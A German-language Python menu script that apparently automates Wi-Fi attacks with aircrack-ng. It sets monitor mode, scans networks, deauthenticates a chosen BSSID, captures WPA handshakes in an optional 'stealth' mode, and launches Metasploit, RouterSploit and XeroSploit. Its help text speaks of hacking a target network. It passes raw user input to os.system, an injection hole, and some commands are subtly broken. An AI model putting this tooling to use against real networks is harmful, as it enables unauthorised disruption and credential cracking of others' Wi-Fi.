
#-*- coding: utf-8 -*-
import sys
import os
import getpass
import subprocess
import atexit
print (sys.argv)
usrnm = getpass.getuser()
os.system("apt-get install python3-pip")



print("Bitte dieses tool mit Root-Privilegien ausführen")

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    #taken from https://stackoverflow.com/questions/287871/how-to-print-colored-text-in-terminal-in-python

print(bcolors.HEADER + "Updatemechanismus "+ bcolors.ENDC + "bitte warten...")


os.system('apt-get install python')
os.system('apt-get install aircrack-ng')
os.system('apt-get update && apt-get upgrade')
print(bcolors.WARNING + 'HINWEIS: ' + bcolors.ENDC + 'root-Privilegien sind für dieses Script erforderlich!')

if os.geteuid() != 0:
    exit(bcolors.FAIL + "Dieses Script muss als root ausgeführt werden! Versuche es noch einmal und hänge vor den Scriptaufruf ein 'sudo'")

os.system("clear")
print(" ____       _                _  _ "+bcolors.WARNING +"      _             _   " +bcolors.ENDC)
print("/ ___|  ___| |__  _ __   ___| || |"+bcolors.WARNING +"  ___| |_ __ _ _ __| |_ "+bcolors.ENDC)
print("\___ \ / __| '_ \| '_ \ / _ \ || |"+bcolors.WARNING +" / __| __/ _` | '__| __|"+bcolors.ENDC)
print(" ___) | (__| | | | | | |  __/ || |"+bcolors.WARNING +" \__ \ || (_| | |  | |_"+bcolors.ENDC)
print("|____/ \___|_| |_|_| |_|\___|_||_|"+bcolors.WARNING +" |___/\__\__,_|_|   \__|"+bcolors.ENDC)
print(" ")
print("Schnellstart-script nützlicher Funktionen von DasPinguin")
print("Logged in as: " +bcolors.WARNING + usrnm +bcolors.ENDC)
print(" ")
print(" ")
print(" ")



l = 1
while l == 1:
    print("")
    print(" "  + bcolors.OKBLUE)
    print("(0) Updatemechanismus")
    print("(1) WLAN-Interface wlan0 in Monitormodus umschalten und Kanal festlegen ")
    print("(2) Alle Netzwerke in der Nähe scannen")
    print("(3) Deauthentifiziere ein bestimmtes WLAN per BSSID und aireplay ")
    print("(4) Schalte WLAN0mon zurück in den Manager-Modus")
    print("(5) Schnappe dir einen WPA-Handshake durch airodump (stealth J/n?)")
    print("(6) Führe Hashcat aus, um die Dateien aus Tool 5 zu knacken")
    print("(7) Aufräumen")
    print("(8) Verlassen.")
    print("(9) Weitere Optionen" + bcolors.ENDC)
    try:
        varcmd = input("Gib eine Zahl ein oder drücke Ctrl + C ein, um zu beenden : ")
        print("Du hast eingegeben: " + bcolors.OKBLUE + str(varcmd))
        #if varcmd > str(9):                HINWEIS: Dieser Code ist in ##, da er im Moment der Veröffentlichung noch Probleme gemacht hat. Ich arbeite an einer Lösung
        #    print(bcolors.ENDC + "Eine gültige Zahl eingeben!")
        if varcmd == str(0):
            os.system('apt-get update && apt-get upgrade')
            os.system('apt-get install python')

        elif varcmd == str(1):
            airmoncmd = input(bcolors.ENDC + "Gib ein" + bcolors.OKGREEN + " WLAN-Interface" + bcolors.ENDC + " ein (? für Hilfe): ")
            if airmoncmd == "?":
                print("Das WLAN-Interface, welches du nutzen willst. Wenn du wissen willst, welche dir zur Verfügung stehen, verlasse das Script über die 8 oder mit CTRL + C und gib ifconfig ein. Du wirst vermutlich 3 Interfaces sehen eth0, wlan0 und lo. Dein WLAN-Interface ist wlan0.")
            else:

                chamoncmd = input("Gib einen" + bcolors.OKGREEN + " Kanal 1-16" + bcolors.ENDC + " ein(? Für Hilfe): ")
                if chamoncmd == "?":
                    print("Der Kanal ist zum Beispiel wichtig für den Befehl aireplay, welcher bei (3) benutzt wird. WLAN hat 16 Kanäle (1-16). Wenn du ein WLAN auf Kanal 6 hacken willst, muss dein WLAN-Interface auch auf Kanal 6 laufen. Auf einem falschen Kanal erhältst du eine Fehlermeldung. Wenn du herausfinden willst, auf welchem Kanal dein Ziel-WLAN läuft führe zuerst (2) aus und schreibe in das Kanalfeld hier irgendeine Zahl. Dein Zielkanal ist in der selben Zeile, wie dein Ziel-WLAN. Du findest ihn in der Spalte CH")
                else:
                    os.system('airmon-ng start ' + airmoncmd +" " + chamoncmd)
        elif varcmd == str(2):
                os.system('airodump-ng wlan0mon')
        elif varcmd == str(3):
            aireplaycmd = input("Gib eine" + bcolors.OKGREEN + " BSSID" + bcolors.ENDC + " ein (? für Hilfe): ")
            if aireplaycmd == "?":
                print("Die BSSID ist die MAC-Adresse des WLANs. Sie ist so aufgebaut: XX:XX:XX:XX:XX:XX, z. B. A1:87:5T:09:12:OA. Du kannst sie unter (2) aufrufen. Die BSSID ist die Spalte ganz links.")
            else:
                airmoncmd = input(bcolors.ENDC + "Gib ein" + bcolors.OKGREEN + " WLAN-Interface" + bcolors.ENDC + " ein (? für Hilfe): ")
                if airmoncmd == "?":
                    print("Das WLAN-Interface, welches du nutzen willst. Wenn du wissen willst, welche dir zur Verfügung stehen, verlasse das Script über die 8 oder mit CTRL + C und gib ifconfig ein. Du wirst vermutlich 3 Interfaces sehen eth0, wlan0 und lo. Dein WLAN-Interface ist wlan0.")
                else:
                    os.system("airmon-ng stop " + airmoncmd)
                    os.system('aireplay-ng --deauth 15 wlan0 -a' + aireplaycmd)
        elif varcmd == str(4):
            wlanmoncmd = input("Gib das WLAN-Interface ein, welches aus dem Monitormodus geholt werden soll (?) für eine Liste: ")
            if wlanmoncmd == "?":
                os.system("airmon-ng")
            else:
                os.system("airmon-ng stop " + wlanmoncmd)
        elif varcmd == str(5):
            print(bcolors.WARNING + "WARNUNG " + bcolors.ENDC + "Ohne den 'Unauffällig'-Modus ist das Tool nur für Penetesting geeignet, da diese Methode auffällig ist! (Die gesendeten Deauthentifizierungs-Packets sind sichtbar!) Zum Beenden einen ungültigen Wert eintragen")
            stealtcmd = input("Unauffällig? J/n: ")
            if stealtcmd == "J":

                wpacmd = input("Gleich öffnet sich das Airodump Interface und du musst warten, bis sich jemand neu mit dem Zielnetzwerk verbindet Gib zuvor noch die Ziel-" + bcolors.OKGREEN + " BSSID" +bcolors.ENDC+ " ein: ")
                os.system("airodump-ng wlan0mon -w wpahandshake --output-format pcap --bssid " + wpacmd)
            elif stealtcmd == "n":
                wpacmd = input("Gib eine" + bcolors.OKGREEN + " BSSID" +bcolors.ENDC+ " ein: ")

                os.system("aireplay-ng --deauth 5 wlan0 -a " + wpacmd)
                os.system("airodump-ng wlan0mon -w wpahandshake --output-format pcap --bssid " + wpacmd)
            else:
                print("Ungültiger Wert")

        elif varcmd == str(6):
            os.system("sudo hashcat --help")
            exit()
        elif varcmd == str(7):
            os.system("clear")
        elif varcmd == str(8):
            l = 0
            exit("Fertig" + bcolors.ENDC)
        elif varcmd == str(9):
            print("(msf) MetaSploit Framework starten.")
            print("(xero) XeroSploit starten.")
            print("(router) RouterSploit starten.")
            print("(msfvenom) MsfVenom-Generator starten.")
        elif varcmd == "msf":
            os.system("msfconsole")
        elif varcmd == "xero":
            os.system("xerosploit")
        elif varcmd == "router":
            os.system("cd /")
            pathcmd = input("Gib deinen normalen Benutzernamen ohne Leerzeichen am Ende ein: ")
            os.system("cd /home/" + pathcmd + "/")
            os.system("cd routersploit")
            os.system("python3 rsf.py")
        elif varcmd == "msfvenom":
            os.system("python3 msfvenomgenerator.py")




    except KeyboardInterrupt:
        print(" ")
        print(bcolors.WARNING + "Beenden..." + bcolors.ENDC)
        exit(os.system("python3 advanced.py"))


    except Exception as e:
        print('Fehler beim Ausführen des Codes: '+ str(e))
        print("Nutze zum Beenden bitte  Ctrl + C oder im Hauptmenü die 8")
